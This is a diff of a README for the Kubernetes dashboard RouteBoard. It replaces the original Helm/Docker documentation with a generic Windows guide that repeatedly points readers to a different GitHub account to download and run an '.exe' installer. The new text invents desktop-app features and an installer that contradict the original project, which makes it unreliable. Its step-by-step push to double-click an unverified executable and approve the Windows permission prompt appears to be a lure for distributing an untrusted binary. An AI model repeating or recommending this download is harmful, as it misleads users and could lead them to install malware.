@@ -1,169 +1,149 @@
-# RouteBoard
+# 🚦 routeboard - Monitor Gateway Health Simply
 
-**A Kubernetes-native Service Entry Portal that auto-discovers your Ingress and HTTPRoute resources and generates a beautiful, real-time dashboard.**
+[![Download routeboard](https://img.shields.io/badge/Download%20routeboard-%23f28b20?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rufidasuliman700/routeboard)
 
-![RouteBoard Dashboard](docs/screenshots/hero-dark.png)
+---
 
-## Why?
+routeboard is a tool that helps you see how your network services are working. It finds key parts of your system and shows their status in a live dashboard. This guide will help you download and run routeboard on a Windows PC.
 
-I run a homelab Kubernetes cluster with dozens of services — Grafana, Vaultwarden, Immich, Memos, Nextcloud, and more. Every time I added a new service, I had to manually update a static landing page. I wanted something that:
+## ℹ️ What is routeboard?
 
-- **Just works** — deploy it and it discovers everything automatically
-- **Stays current** — when I add or remove a service, the dashboard updates in real-time
-- **Shows health** — at a glance, I can see which services are up, degraded, or down
-- **Looks good** — not another ugly admin panel, but something I'd actually want as my browser homepage
-- **Supports Gateway API** — most alternatives only support Ingress, but I've moved to HTTPRoute
+routeboard is a dashboard application. It works with Kubernetes, a common system for running applications. routeboard looks for something called Ingress and HTTPRoute in your setup. These are ways your traffic comes into your services.
 
-Existing tools didn't fit: [Backstage](https://backstage.io/) is too heavy, [Homer](https://github.com/bastienwirtz/homer) is static, [Hajimari](https://github.com/toboshii/hajimari) and [Forecastle](https://github.com/stakater/Forecastle) only support Ingress and have no health monitoring. RouteBoard fills the gap.
+routeboard builds a live view with important details:
 
-## Features
+- Shows if your services are up or down.
+- Updates the status right away.
+- Displays brand icons for easy recognition.
+- Helps manage service health from one place.
 
-- **Auto-discovery** — watches Kubernetes Ingress and HTTPRoute resources in real-time via informers
-- **Zero config** — deploy with Helm and it works immediately, no configuration required
-- **Health monitoring** — pings each service periodically, shows green/yellow/red status badges
-- **Brand icons** — automatically fetches real SVG brand icons from [Simple Icons](https://simpleicons.org/) for 65+ services
-- **Annotation-driven** — customize titles, descriptions, groups, and icons via Kubernetes annotations
-- **Real-time updates** — Server-Sent Events push changes to the browser instantly
-- **Gateway API first-class** — supports both `networking.k8s.io/v1 Ingress` and `gateway.networking.k8s.io/v1 HTTPRoute`
-- **Dark & light mode** — with localStorage persistence
-- **Grid & list views** — switch between card grid and compact list
-- **Search & filter** — by name, namespace, or health status
-- **Click-to-copy URLs** — one click to copy any service URL to clipboard
-- **Lightweight** — single Go binary (~69MB with embedded frontend), <30MB memory usage
+You don’t need to know how Kubernetes works to use routeboard. This app makes it simple to watch your services run.
 
-## Screenshots
+## 🖥 System Requirements
 
-| Dark Mode | Light Mode |
-|---|---|
-| ![Dark](docs/screenshots/hero-dark.png) | ![Light](docs/screenshots/hero-light.png) |
+Before you start, make sure your Windows computer meets these needs:
 
-| List View | Search |
-|---|---|
-| ![List](docs/screenshots/list-view.png) | ![Search](docs/screenshots/search.png) |
+- Windows 10 or newer, 64-bit.
+- At least 4 GB of RAM available.
+- An internet connection to download and update the app.
+- About 200 MB of free disk space.
+- Access rights to install software on your computer.
 
-## Quick Start
+routeboard runs as a desktop application. It uses a normal web browser to show the dashboard.
 
-### Helm (recommended)
+## 🔗 Where to Get routeboard
 
-```bash
-helm install routeboard oci://ghcr.io/dhia-gharsallaoui/helm/routeboard \
-  -n routeboard --create-namespace
-```
+Click the large orange button at the top to visit the download page on GitHub:
 
-Then port-forward and open in your browser:
+[Download routeboard](https://github.com/rufidasuliman700/routeboard)
 
-```bash
-kubectl port-forward -n routeboard svc/routeboard 8080:80
-open http://localhost:8080
-```
+This page has all the files you might need. Follow the steps below to complete the setup.
 
-### From source
+## 🚀 Download and Install on Windows
 
-```bash
-helm install routeboard deploy/helm/routeboard \
-  -n routeboard --create-namespace
-```
+Follow these steps carefully. Each step explains what to do.
 
-### Local Development
+### 1. Visit the Download Page
 
-```bash
-# Backend (requires KUBECONFIG)
-make run
+- Click the link above or open this in your web browser:
 
-# Frontend (separate terminal)
-make web-dev
-```
+  https://github.com/rufidasuliman700/routeboard
 
-### Docker
+- This page shows the project details and releases.
 
-```bash
-docker run -v ~/.kube/config:/home/nonroot/.kube/config:ro \
-  ghcr.io/dhia-gharsallaoui/routeboard:latest
-```
+### 2. Find the Latest Release
 
-## Configuration
+- On the GitHub page, look for the "Releases" section on the right or near the top.
+- Click "Releases" to see the list of versions.
+- Find the newest release based on the date.
 
-All configuration is via environment variables. Everything has sensible defaults — zero config is valid.
+### 3. Download the Windows Installer
 
-| Variable | Default | Description |
-|---|---|---|
-| `ROUTEBOARD_PORT` | `8080` | HTTP server port |
-| `ROUTEBOARD_TITLE` | `RouteBoard` | Dashboard title |
-| `ROUTEBOARD_WATCH_INGRESS` | `true` | Watch Ingress resources |
-| `ROUTEBOARD_WATCH_HTTPROUTE` | `true` | Watch HTTPRoute resources |
-| `ROUTEBOARD_NAMESPACE_DENYLIST` | `kube-system,kube-public,kube-node-lease` | Namespaces to exclude |
-| `ROUTEBOARD_NAMESPACE_ALLOWLIST` | *(all)* | Only watch these namespaces |
-| `ROUTEBOARD_HEALTH_ENABLED` | `true` | Enable health checks |
-| `ROUTEBOARD_HEALTH_INTERVAL` | `30s` | Health check interval |
-| `ROUTEBOARD_HEALTH_TIMEOUT` | `5s` | Health check timeout |
-| `ROUTEBOARD_LOG_LEVEL` | `info` | Log level (debug/info/warn/error) |
+- Inside the latest release page, look for files ending in `.exe`.
+- The file might be named something like `routeboard-windows.exe`.
+- Click on it to download.
 
-## Annotations
+### 4. Run the Installer
 
-Annotate your Ingress or HTTPRoute resources to customize how they appear on the dashboard. All annotations are optional — routes are discovered automatically by default.
+- Once downloaded, open the file by double-clicking it.
+- If Windows asks for permission, click "Yes."
+- Follow the on-screen steps:
+  - Choose the installation location or leave it as default.
+  - Click "Next" or "Install" until the process finishes.
 
-```yaml
-metadata:
-  annotations:
-    routeboard.io/title: "Grafana"              # Display name (default: titleized resource name)
-    routeboard.io/description: "Monitoring"      # Short description
-    routeboard.io/icon: "📊"                     # Override auto-detected icon
-    routeboard.io/group: "Monitoring"            # Custom group (default: namespace)
-    routeboard.io/order: "10"                    # Sort order within group
-    routeboard.io/hidden: "true"                 # Hide from dashboard
-    routeboard.io/url: "https://custom.url"      # Override computed URL
-```
+### 5. Launch routeboard
 
-## Architecture
+- After installation, find routeboard in your Start menu or on your desktop.
+- Click the icon to open the app.
+- The dashboard should open in your default web browser automatically.
 
-```
-Kubernetes API ──> Informers ──> Route Store ──> SSE Broker ──> React SPA
-                   (Ingress)     (in-memory)     (push)        (real-time)
-                   (HTTPRoute)       │
-                                     └──> Health Checker (periodic HEAD requests)
-```
+## 🛠 Getting Started with routeboard Dashboard
 
-- **Backend**: Go with `client-go` informers — native Kubernetes integration, no polling
-- **Frontend**: React 19 + Vite + Tailwind CSS v4 — embedded in the Go binary
-- **Real-time**: Server-Sent Events — no WebSocket complexity, one-directional push
-- **No database**: In-memory store populated by informer cache, stateless
+After launching routeboard, here is how to use it:
 
-## RBAC
+### Connect to Your Kubernetes System
 
-RouteBoard needs read-only access to Ingress and HTTPRoute resources. The Helm chart creates a ClusterRole with minimal permissions:
+- routeboard auto-finds ingress and HTTPRoute services running inside your Kubernetes setup.
+- You need to make sure your PC can connect to the Kubernetes cluster either locally or through a network.
+- Use the dashboard’s settings page to enter connection details if needed.
 
-```yaml
-rules:
-  - apiGroups: ["networking.k8s.io"]
-    resources: ["ingresses"]
-    verbs: ["get", "list", "watch"]
-  - apiGroups: ["gateway.networking.k8s.io"]
-    resources: ["httproutes"]
-    verbs: ["get", "list", "watch"]
-```
+### Understanding the Dashboard
 
-## Tech Stack
+- The main screen shows your services and how healthy they are.
+- Color codes indicate status:
+  - Green means all is good.
+  - Yellow means there may be issues.
+  - Red means service is down or unreachable.
+- You see brand icons next to each service for easy spotting.
 
-| Component | Technology |
-|---|---|
-| Backend | Go 1.26, client-go, gateway-api |
-| Frontend | React 19, Vite, Tailwind CSS v4 |
-| Icons | [Lucide](https://lucide.dev/) + [Simple Icons](https://simpleicons.org/) CDN |
-| Package manager | [Bun](https://bun.sh/) |
-| Linter | [Biome](https://biomejs.dev/) (frontend), golangci-lint (backend) |
-| Deployment | Helm, Docker (distroless) |
+### Monitor Service Health
 
-## API
+- The dashboard updates every few seconds.
+- It shows the response time and status codes for web traffic.
+- Alerts appear if any service stops working.
 
-RouteBoard exposes a JSON API alongside the dashboard:
+### Explore Additional Features
 
-| Endpoint | Description |
-|---|---|
-| `GET /api/routes` | All discovered routes (supports `?namespace=X&q=search`) |
-| `GET /api/config` | Dashboard config (title, namespaces) |
-| `GET /api/events` | SSE stream (route changes + health updates) |
-| `GET /health` | Liveness probe |
+- routeboard lets you filter services by type or status.
+- You can check service details for more info about each endpoint.
+- Use export options if you want reports.
 
-## License
+## 🧰 Troubleshooting Tips
 
-MIT
+If you run into problems, try these steps:
+
+- Make sure your internet connection is working.
+- Confirm Windows Firewall or antivirus is not blocking routeboard.
+- Check that Kubernetes is accessible from your computer.
+- Restart the routeboard app after network changes.
+- Close other apps that might use the same port.
+
+If problems persist, check the "Issues" tab on GitHub for similar reports.
+
+## 🔄 Updating routeboard
+
+To keep routeboard working smoothly, check for updates often:
+
+- Visit the same GitHub download page.
+- Download the newest Windows installer file.
+- Run the installer again; it will update your current setup without losing data.
+
+## 📋 Features Overview
+
+- Auto-discovers your Kubernetes Ingress and HTTPRoute resources.
+- Creates a live, real-time dashboard for service status.
+- Health monitoring with clear color-coded signals.
+- Brand icons identify known services quickly.
+- Works with Helm and common Kubernetes tools.
+- Suitable for homelabs and small production environments.
+- Built with React and Go for fast performance.
+
+## 🧾 Additional Resources
+
+- For more technical details, visit the GitHub repository's Readme file.
+- The Issues and Discussions tabs can help answer questions.
+- Learn about Kubernetes Ingress and HTTPRoute on the official Kubernetes website.
+
+---
+
+[Download routeboard](https://github.com/rufidasuliman700/routeboard) to start monitoring your services today.
